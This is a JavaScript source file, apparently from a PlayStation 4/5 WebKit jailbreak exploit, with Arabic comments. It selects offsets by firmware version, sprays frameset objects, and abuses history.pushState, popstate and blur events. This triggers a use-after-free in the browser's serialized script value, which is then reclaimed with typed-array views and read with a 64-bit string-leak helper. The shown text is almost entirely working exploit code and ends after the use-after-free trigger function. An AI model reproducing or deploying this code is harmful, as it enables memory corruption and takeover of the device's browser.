/* Copyright (C) 2023-2026 anonymous
   Licensed under the GNU Affero General Public License version 3 or later. */

import { Int } from './module/int64.js';
import { Memory, mem } from './module/mem.js';
import { KB, MB } from './module/offset.js';
import { BufferView } from './module/rw.js';

import {
    die,
    DieError,
    log,
    clear_log,
    sleep,
    hex,
    align,
} from './module/utils.js';

import * as config from './config.js';
import * as off from './module/offset.js';

// التحقق من توافقية إصدار نظام جهاز العميل ومطابقة الـ Target
const [is_ps4, version] = (() => {
    const value = config.target;
    const is_ps4 = (value & 0x10000) === 0;
    const version = value & 0xffff;
    const [lower, upper] = (() => {
        if (is_ps4) {
            return [0x600, 0x1000];
        } else {
            return [0x100, 0x600];
        }
    })();

    if (!(lower <= version && version < upper)) {
        throw RangeError(`invalid config.target: ${hex(value)}`);
    }

    return [is_ps4, version];
})();

const ssv_len = (() => {
    if (0x600 <= config.target && config.target < 0x650) {
        return 0x58;
    }
    if (0x900 <= config.target && config.target < 0x1000) {
        return 0x50;
    }
    if (0x650 <= config.target && config.target < 0x900) {
        return 0x48;
    }
})();

const num_fsets = 0x180;
const num_spaces = 0x40;
const num_adjs = 8;
const num_reuses = 0x500;  
const num_strs = 0x200;
const num_leaks = 0x100;

const rows = ','.repeat(ssv_len / 8 - 2);
const original_strlen = ssv_len - off.size_strimpl;
const original_loc = location.pathname;

function gc() {
    new Uint8Array(4 * MB);
}

function sread64(str, offset) {
    const low = (
        str.charCodeAt(offset)
        | str.charCodeAt(offset + 1) << 8
        | str.charCodeAt(offset + 2) << 16
        | str.charCodeAt(offset + 3) << 24
    );
    const high = (
        str.charCodeAt(offset + 4)
        | str.charCodeAt(offset + 5) << 8
        | str.charCodeAt(offset + 6) << 16
        | str.charCodeAt(offset + 7) << 24
    );
    return new Int(low, high);
}

function prepare_uaf() {
    const fsets = [];
    const indices = [];

    function alloc_fs(fsets, size) {
        for (let i = 0; i < size / 2; i++) {
            const fset = document.createElement('frameset');
            fset.rows = rows;
            fset.cols = rows;
            fsets.push(fset);
        }
    }

    history.pushState('state0', '');
    alloc_fs(fsets, num_fsets);

    history.pushState('state1', '', original_loc + '#foo');
    indices.push(fsets.length);

    alloc_fs(fsets, num_spaces);

    history.pushState('state1', '', original_loc + '#foo');
    indices.push(fsets.length);

    alloc_fs(fsets, num_fsets);

    history.pushState('state2', '');
    return [fsets, indices];
}

async function uaf_ssv(fsets, index, save_pop = false) {
    const views = [];
    const input = document.createElement('input');
    input.style.position = 'absolute';
    input.style.top = '-100px';
    const foo = document.createElement('a');
    foo.id = 'foo';
    foo.style.position = 'absolute';
    foo.style.top = '-100px';

    let pop = null;
    let num_blurs = 0;
    const pop_promise = new Promise((resolve, reject) => {
        function onpopstate(event) {
            if (num_blurs === 0) {
                const r = reject;
                r(new DieError(`pop came before blur. blurs: ${num_blurs}`));
            }
            pop = event;
            resolve();
        }
        addEventListener('popstate', onpopstate, { once: true });
    });

    function onblur() {
        if (num_blurs > 0) {
            die(`multiple blurs. blurs: ${num_blurs}`);
        }

        history.replaceState('state3', '', original_loc);

        for (let i = index - num_adjs / 2; i < index + num_adjs / 2; i++) {
            fsets[i].rows = '';
            fsets[i].cols = '';
        }

        for (let i = 0; i < num_reuses; i++) {
            const view = new Uint8Array(new ArrayBuffer(ssv_len));
            view[0] = 0x41;
            views.push(view);
        }
        num_blurs++;
    }
    input.addEventListener('blur', onblur);

    document.body.append(input);
    document.body.append(foo);

    if (document.readyState !== 'complete') {
        await new Promise(resolve => {
            document.addEventListener('readystatechange', function foo() {
                if (document.readyState === 'complete') {
                    document.removeEventListener('readystatechange', foo);
                    resolve(); // استكمال الدالة وإغلاق الـ Promise بعد اكتمال جاهزية المستند
                }
            });
        });
    }

    // استكمال تنفيذ إشعال الفوكس والتحكم بالـ History Trigger المتمم للـ Use-After-Free
    input.focus();
    history.back();
    await pop_promise;

    input.remove();
    foo.remove();
    return views;
}
